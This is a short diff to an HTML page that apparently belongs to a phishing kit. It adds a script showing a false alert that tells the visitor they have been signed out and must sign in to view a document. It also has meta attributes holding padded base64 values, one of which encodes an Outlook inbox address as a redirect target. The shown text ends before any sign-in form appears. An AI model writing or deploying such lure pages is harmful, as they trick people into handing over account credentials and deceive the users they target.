@@ -1,4 +1,7 @@
 <html dir="ltr" class="" landing="" lang="en">
+    <script language="javascript">
+alert('You have been signed out of your Account . Click OK to sign in and view document.');
+</script>
     <head>
     <meta common="ANY_RANDON_VALUESiowikiej1kelUxTWxCMk1TczNORE5WTWtFNVNHNW9aRU52UkVwQ2VWbzFUVnBsTVhwSVdGTlBZME5RUlZsS2RXWkhjMGRaVkhNNWFVUXJRVEpHUlRKeFRISldXazRyU0VabVEyczNPR3hQTDJsWlNHRTJXVVZLTTBOaVMwNUlLek5IVEZGT2VFaG9WQzh6VWs1QmFVMDkmdj1ubyZhPWdybmRidWNhLXJvdGF0ZTp2dmM5cXF2dDk1Mmk=ikiwoiANY_RANDON_VALUES" redirme="ANY_RANDON_VALUESinikiaHR0cHM6Ly9vdXRsb29rLm9mZmljZS5jb20vbWFpbC9pbmJveC8=ikiwiiANY_RANDON_VALUES">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
